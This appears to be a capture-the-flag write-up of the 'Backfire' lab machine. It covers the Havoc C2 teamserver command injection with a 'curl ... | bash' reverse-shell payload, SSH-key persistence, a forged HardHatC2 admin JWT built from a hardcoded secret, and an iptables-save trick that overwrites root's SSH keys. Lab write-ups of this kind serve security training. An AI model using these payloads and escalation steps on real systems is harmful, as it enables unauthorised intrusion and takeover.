# Backfire

```
Difficulty: Medium
Operating System: Linux
Hints: True
```


### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used                          | Result                                                                                                                                |                                      |
| :--- | :------------ | :-------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------ |
| 1    | `N/A`         | **Nmap Scan**                           | Discovered open ports `22` (SSH), `443`, `5000` (filtered), and `8000` (HTTP). Found two interesting files on `backfire.htb:8000`.    |                                      |
| 2    | `N/A`         | **Havoc Configuration Analysis**        | Discovered `havoc.yaotl` with credentials for users `ilya` and `sergej`. Found disable\_tls.patch showing vulnerable WebSocket usage. |                                      |
| 3    | `N/A`         | **SSRF & WebSocket Exploit**            | Combined public scripts to forge an agent registration and upgrade HTTP to WebSocket communication for command injection.             |                                      |
| 4    | `ilya`        | **Remote Code Execution**               | Exploited vulnerable WebSocket command injection to run \`curl [http://10.10.xx.xx/shell.sh](http://10.10.xx.xx/shell.sh)             | bash`. Obtained initial `user.txt\`. |
| 5    | `ilya`        | **Persistence via SSH Key**             | Appended our public SSH key to `~/.ssh/authorized_keys` to ensure persistent access.                                                  |                                      |
| 6    | `ilya`        | **HardHatC2 JWT Authentication Bypass** | Generated admin JWT token using hardcoded secret and created new privileged user `sth_pentest`.                                       |                                      |
| 7    | `sth_pentest` | **Interactive Terminal Access**         | Logged into HardHatC2 web interface at `https://127.0.0.1:7096/`.                                                                     |                                      |
| 8    | `sergej`      | **Privilege Escalation with iptables**  | Used `sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n<ssh-key>\n'` to overwrite root SSH key.                        |                                      |
| 9    | `root`        | **Root Access**                         | Logged in via SSH as root using the overwritten key and retrieved `root.txt`.                                                         |                                      |


##  Nmap Scan

```bash
[root@kali] /home/kali/Backfire  
❯ nmap backfire.htb -sV -Pn -T4

PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
443/tcp  open     ssl/http nginx 1.22.1
5000/tcp filtered upnp
8000/tcp open     http     nginx 1.22.1



> Visit `http://backfire.htb:8000` and found two files:
>
> * `havoc.yaotl`
> * `disable_tls.patch`

---

## ⚙️ Havoc Configuration (`havoc.yaotl`)

```ini
Teamserver {
    Host = "127.0.0.1"
    Port = 40056
}

Operators {
    user "ilya" { Password = "CobalXXXXXXXXXXXXX" }
    user "sergej" { Password = "1w4nXXXXXXXXXXXXXXXXXX" }
}

Listeners {
    Http {
        Name = "Demon Listener"
        Hosts = ["backfire.htb"]
        HostBind = "127.0.0.1"
        PortBind = 8443
        Secure = true
    }
}
```

---

##  TLS Disabled Patch

The patch disabled TLS and switched from `wss://` to `ws://` for WebSocket connections.

```diff
- auto Server = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";
+ auto Server = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/havoc/";

- Socket->setSslConfiguration(SslConf);
- if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil {
+ if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
```

>  Havoc server is exposed and credentials are available, but direct connection fails.

---

## 🧱 Havoc RCE Vulnerability Exploitation

### Related PoCs Found:

* [Havoc-C2-SSRF-poc by chebuya](https://github.com/chebuya/Havoc-C2-SSRF-poc)
* [c2-vulnerabilities by IncludeSecurity](https://github.com/IncludeSecurity/c2-vulnerabilities)


###  Attack Summary

1. Forge agent registration → open a socket → upgrade HTTP to WebSocket
2. Authenticate to teamserver
3. Create a listener agent
4. Inject a reverse shell command via command injection vulnerability

---

###  Key HTTP Header for WebSocket Upgrade

```http
GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDXXXXXXXXXX==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
```

---

###  Final Python Exploit Workflow

```python
# Steps:
# 1. Register forged agent
# 2. Open socket connection
# 3. Upgrade to WebSocket
# 4. Authenticate with teamserver
# 5. Create listener agent
# 6. Inject malicious command

# Example RCE Command
cmd = 'curl http://10.10.xx.xx/shell.sh | bash'

# Final Injection
injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
```

> Successfully obtained `user.txt`

---

##  Privilege Escalation (Root)

### 1 Maintain Persistent Access

On the reverse shell:

```bash
echo "your_public_ssh_key" >> ~/.ssh/authorized_keys
```

---

### 2 HardHatC2 Authentication Bypass

SSH Proxy local ports:

```bash
ssh -i ~/.ssh/id_rsa ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000
```

Generate Admin JWT Token:

```python
import jwt
import datetime
import uuid
import requests

secret = "jtee43gt-6543-2iur-9422-XXXXXXXXXX"
payload = {
    "sub": "HardHat_Admin",
    "jti": str(uuid.uuid4()),
    "iss": "hardhatc2.com",
    "aud": "hardhatc2.com",
    "iat": int(datetime.datetime.utcnow().timestamp()),
    "exp": int((datetime.datetime.utcnow() + datetime.timedelta(days=28)).timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator"
}

token = jwt.encode(payload, secret, algorithm="HS256")

burp0_url = "https://127.0.0.1:5000/Login/Register"
burp0_headers = {
    "Authorization": f"Bearer {token}",
    "Content-Type": "application/json"
}
burp0_json = {
    "username": "sth_pentest",
    "password": "sth_pentest",
    "role": "TeamLead"
}

r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
```

>  User `sth_pentest` created successfully
>  Logged into `https://127.0.0.1:7096/` to get terminal access.

---

### 3 iptables Privilege Escalation

Bypass file restrictions by abusing iptables comments.

```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\n your_ed25519_pub_keys\n'
sudo iptables-save -f /root/.ssh/authorized_keys
```

>  Persisted root SSH access
>  Finally retrieved `root.txt`



 Successfully completed the box.

